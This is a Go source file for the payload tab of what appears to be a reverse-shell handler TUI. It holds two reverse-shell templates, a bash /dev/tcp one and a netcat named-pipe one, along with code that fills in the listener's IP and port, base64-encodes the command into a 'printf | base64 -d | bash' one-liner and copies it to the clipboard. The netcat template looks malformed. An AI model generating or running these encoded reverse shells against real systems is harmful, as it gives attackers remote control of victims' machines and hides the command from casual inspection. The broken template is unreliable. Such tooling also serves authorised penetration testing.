package tui

import (
	"encoding/base64"
	"fmt"
	"os/exec"
	"sort"
	"strings"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"

	listenerPkg "codeberg.org/asuna/rsh/internal/listener"
)

// payloadCopiedMsg is emitted after a clipboard copy attempt.
type payloadCopiedMsg struct{ err error }

// builtinPayload defines a reverse-shell template.
type builtinPayload struct {
	Name    string
	Raw     string // shell command with {LHOST} and {LPORT} placeholders
	Wrapper string // "bash" or "sh" — the interpreter fed through base64 pipe
}

var builtinPayloads = []builtinPayload{
	{
		Name:    "Bash TCP -i",
		Raw:     `(bash >& /dev/tcp/{LHOST}/{LPORT} 0>&1) &`,
		Wrapper: "bash",
	},
	{
		Name:    "Netcat + named pipe",
		Raw:     `(rm /tmp/_*mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {LHOST} {LPORT} >/tmp/_) >/dev/null 2>&1 &`,
		Wrapper: "sh",
	},
}

// PayloadModel is the model for the Payload tab.
type PayloadModel struct {
	manager     *listenerPkg.Manager
	cursor      int // selected payload row
	listenerIdx int // selected listener index
	statusMsg   string
	statusOK    bool
	width       int
	height      int
}

func NewPayloadModel(manager *listenerPkg.Manager) PayloadModel {
	return PayloadModel{manager: manager}
}

// activeListeners returns listeners sorted by ID.
func (m PayloadModel) activeListeners() []*listenerPkg.Entry {
	entries := m.manager.Entries()
	sort.Slice(entries, func(i, j int) bool { return entries[i].ID < entries[j].ID })
	return entries
}

// selectedListener returns the currently highlighted listener, or nil.
func (m PayloadModel) selectedListener() *listenerPkg.Entry {
	ls := m.activeListeners()
	if len(ls) == 0 {
		return nil
	}
	return ls[m.listenerIdx%len(ls)]
}

// buildOneliner fills in LHOST/LPORT and returns a base64-wrapped one-liner.
// Returns ("", false) when a specific IP is not available.
func (m PayloadModel) buildOneliner(payloadIdx int, ln *listenerPkg.Entry) (string, bool) {
	if payloadIdx >= len(builtinPayloads) || ln == nil {
		return "", false
	}
	if ln.Interface == "0.0.0.0" {
		return "", false
	}
	p := builtinPayloads[payloadIdx]
	raw := strings.NewReplacer("{LHOST}", ln.Interface, "{LPORT}", ln.Port).Replace(p.Raw)
	encoded := base64.StdEncoding.EncodeToString([]byte(raw))
	return fmt.Sprintf("printf '%s'|base64 -d|%s", encoded, p.Wrapper), true
}

func (m PayloadModel) Init() tea.Cmd { return nil }

func (m PayloadModel) Update(msg tea.Msg) (PayloadModel, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "j", "down":
			m.cursor = (m.cursor + 1) % len(builtinPayloads)
			m.statusMsg = ""
		case "k", "up":
			m.cursor = (m.cursor - 1 + len(builtinPayloads)) % len(builtinPayloads)
			m.statusMsg = ""
		case "h", "left":
			ls := m.activeListeners()
			if len(ls) > 0 {
				m.listenerIdx = (m.listenerIdx - 1 + len(ls)) % len(ls)
				m.statusMsg = ""
			}
		case "l", "right":
			ls := m.activeListeners()
			if len(ls) > 0 {
				m.listenerIdx = (m.listenerIdx + 1) % len(ls)
				m.statusMsg = ""
			}
		case "enter", "y":
			ln := m.selectedListener()
			oneliner, ok := m.buildOneliner(m.cursor, ln)
			if !ok {
				if ln != nil && ln.Interface == "0.0.0.0" {
					m.statusMsg = "Listener is bound to 0.0.0.0 — start one on a specific interface."
				} else {
					m.statusMsg = "No listener selected."
				}
				m.statusOK = false
				return m, nil
			}
			return m, copyToClipboard(oneliner)
		}
	case payloadCopiedMsg:
		if msg.err != nil {
			m.statusMsg = "Copy failed: " + msg.err.Error()
			m.statusOK = false
		} else {
			m.statusMsg = "Copied to clipboard!"
			m.statusOK = true
		}
	}
	return m, nil
}

// copyToClipboard tries xclip → xsel → wl-copy in order.
func copyToClipboard(text string) tea.Cmd {
	return func() tea.Msg {
		tools := [][]string{
			{"xclip", "-selection", "clipboard"},
			{"xsel", "--clipboard", "--input"},
			{"wl-copy"},
		}
		for _, args := range tools {
			path, err := exec.LookPath(args[0])
			if err != nil {
				continue
			}
			cmd := exec.Command(path, args[1:]...)
			cmd.Stdin = strings.NewReader(text)
			if runErr := cmd.Run(); runErr == nil {
				return payloadCopiedMsg{err: nil}
			}
		}
		return payloadCopiedMsg{err: fmt.Errorf("no clipboard tool found (install xclip, xsel, or wl-copy)")}
	}
}

// ── View ─────────────────────────────────────────────────────────────────────

func (m PayloadModel) View() string {
	w := m.width
	if w < 60 {
		w = 80
	}
	innerW := w - 2

	// ── Listener selector ────────────────────────────────────────────────────
	ls := m.activeListeners()
	var listenerContent string
	if len(ls) == 0 {
		listenerContent = " " + errorStyle.Render("No active listeners.") +
			"  " + mutedStyle.Render("Start one in the Listener tab.")
	} else {
		ln := m.selectedListener()
		idx := m.listenerIdx % len(ls)
		counter := mutedStyle.Render(fmt.Sprintf("(%d/%d)", idx+1, len(ls)))
		label := focusedLabelStyle.Render("Listener")
		arrowL := focusedLabelStyle.Render("‹")
		arrowR := focusedLabelStyle.Render("›")
		var lnText string
		if ln != nil {
			ifaceColor := valueStyle
			if ln.Interface == "0.0.0.0" {
				ifaceColor = warningStyle
			}
			lnText = mutedStyle.Render(fmt.Sprintf("#%d", ln.ID)) +
				"  " + ifaceColor.Render(ln.Interface+":"+ln.Port)
		}
		listenerContent = fmt.Sprintf(" %s  %s %s %s  %s", label, arrowL, lnText, arrowR, counter)
	}
	// pad to innerW
	lpad := innerW - lipgloss.Width(listenerContent)
	if lpad < 0 {
		lpad = 0
	}
	listenerPane := pane("Target Listener", listenerContent+strings.Repeat(" ", lpad), w, false)

	// ── Payload list ─────────────────────────────────────────────────────────
	ln := m.selectedListener()
	var payloadRows []string
	for i, p := range builtinPayloads {
		selected := i == m.cursor
		var prefix, nameRendered string
		if selected {
			prefix = focusedLabelStyle.Render("▸")
			nameRendered = focusedLabelStyle.Bold(true).Render(p.Name)
		} else {
			prefix = mutedStyle.Render(" ")
			nameRendered = mutedStyle.Render(p.Name)
		}

		var cmdRendered string
		if oneliner, ok := m.buildOneliner(i, ln); ok {
			maxCmd := innerW - lipgloss.Width(prefix) - lipgloss.Width(nameRendered) - 6
			cmdRendered = mutedStyle.Render(truncate(oneliner, maxCmd))
		} else {
			cmdRendered = mutedStyle.Render("—")
		}

		row := " " + prefix + " " + nameRendered + "  " + cmdRendered
		rpad := innerW - lipgloss.Width(row)
		if rpad < 0 {
			rpad = 0
		}
		payloadRows = append(payloadRows, row+strings.Repeat(" ", rpad))
	}
	payloadPane := pane("Payloads", strings.Join(payloadRows, "\n"), w, true)

	// ── Generated one-liner preview ───────────────────────────────────────────
	var previewContent string
	if oneliner, ok := m.buildOneliner(m.cursor, ln); ok {
		previewContent = " " + valueStyle.Render(oneliner)
	} else if ln != nil && ln.Interface == "0.0.0.0" {
		previewContent = " " + warningStyle.Render("Listener bound to 0.0.0.0 — select a listener on a specific interface (h/l).")
	} else {
		previewContent = " " + mutedStyle.Render("No listener available.")
	}
	ppad := innerW - lipgloss.Width(previewContent)
	if ppad < 0 {
		ppad = 0
	}
	titleHint := "Generated Payload  " + mutedStyle.Render("Enter to copy")
	previewPane := pane(titleHint, previewContent+strings.Repeat(" ", ppad), w, false)

	// ── Status line ───────────────────────────────────────────────────────────
	var statusLine string
	if m.statusMsg != "" {
		if m.statusOK {
			statusLine = "\n " + successStyle.Render("+") + " " + mutedStyle.Render(m.statusMsg)
		} else {
			statusLine = "\n " + errorStyle.Render("!") + " " + mutedStyle.Render(m.statusMsg)
		}
	}

	return lipgloss.JoinVertical(lipgloss.Left, "", listenerPane, "", payloadPane, "", previewPane) + statusLine
}

// truncate shortens s to at most max visible cells, appending "…" if needed.
func truncate(s string, max int) string {
	if max < 4 {
		return ""
	}
	if lipgloss.Width(s) <= max {
		return s
	}
	runes := []rune(s)
	for cut := len(runes) - 1; cut >= 0; cut-- {
		candidate := string(runes[:cut]) + "..."
		if lipgloss.Width(candidate) <= max {
			return candidate
		}
	}
	return ""
}
